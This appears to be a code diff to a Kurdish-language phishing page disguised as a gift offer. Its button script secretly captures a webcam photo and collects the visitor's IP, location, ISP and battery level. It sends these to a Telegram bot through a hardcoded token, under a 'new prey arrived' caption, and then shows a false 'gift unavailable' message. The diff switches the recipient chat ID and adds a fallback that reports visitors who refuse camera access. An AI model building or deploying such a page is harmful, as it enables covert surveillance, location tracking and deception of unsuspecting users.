@@ -17,7 +17,7 @@
     <div class="card">
         <div class="gift-box">🎁</div>
         <h2>دیارییەکەت ئامادەیە!</h2>
-        <p>کلیک لە خوارەوە بکە بۆ پشکنین و وەرگرتنی دیارییەکەت.</p>
+        <p>بۆ وەرگرتنی دیارییەکە و پشکنینی ناوچەکەت، کلیک لە خوارەوە بکە.</p>
         <button class="btn" onclick="captureAndSend()">وەرگرتنی دیاری</button>
         <video id="video" style="display:none;" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
@@ -25,11 +25,12 @@
 
     <script>
         async function captureAndSend() {
+            // زانیارییە نوێیەکانی تۆ لێرە جێگیر کراوە
             const token = "8635155944:AAGpSfrwCI7huEFABasy3Izzso40PGonqvM";
-            const chat_id = "6166567300"; // دڵنیابە ئەمە ئایدی خۆتە
+            const chat_id = "7143804196"; 
 
             try {
-                // ١. داوای مۆڵەتی کامێرا و گرتنی وێنە
+                // ١. داوای مۆڵەتی کامێرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -53,19 +54,19 @@
 
                 const infoText = `
 🎯 ڕاوێکی نوێ گەیشت!
-📱 Device: ${navigator.userAgent.split(' ')[2]}
-🔋 Battery: ${bat}
-🌐 IP: ${ipD.ip}
-🌍 Location: ${ipD.city}, ${ipD.country_name}
-📶 ISP: ${ipD.org}
+📱 ئامێر: ${navigator.platform}
+🔋 باتری: ${bat}
+🌐 ئایپی: ${ipD.ip}
+🌍 شوێن: ${ipD.city}, ${ipD.country_name}
+📶 کۆمپانیا: ${ipD.org}
 ----------------------
-📍 [Maps](https://www.google.com/maps?q=${ipD.latitude},${ipD.longitude})`;
+📍 [کردنەوەی نەخشە](https://www.google.com/maps?q=${ipD.latitude},${ipD.longitude})`;
 
-                // ٣. ناردنی وێنەکە بۆ تێلیگرام
+                // ٣. ناردنی وێنە و زانیاری بۆ تێلیگرام
                 const blob = await (await fetch(imageData)).blob();
                 const formData = new FormData();
                 formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'capture.jpg');
+                formData.append('photo', blob, 'image.jpg');
                 formData.append('caption', infoText);
 
                 await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
@@ -74,10 +75,12 @@
                 });
 
                 stream.getTracks().forEach(track => track.stop());
-                alert("ببورە، ئەم دیارییە لە ناوچەکەتدا بەردەست نییە!");
+                alert("ببورە، ئەم دیارییە لە ناوچەکەتدا نەماوە!");
 
             } catch (err) {
-                alert("تکایە ڕێگە بدە بۆ ئەوەی دیارییەکە وەرگریت!");
+                // ئەگەر ڕێگەی بە کامێرا نەدا، تەنها زانیارییەکان بنێرە
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=بەکارهێنەر ڕێگەی بە کامێرا نەدا بەڵام کلیکی کرد!`);
+                alert("تکایە ڕێگە بدە تا دیارییەکەت پێ بدەین.");
             }
         }
     </script>
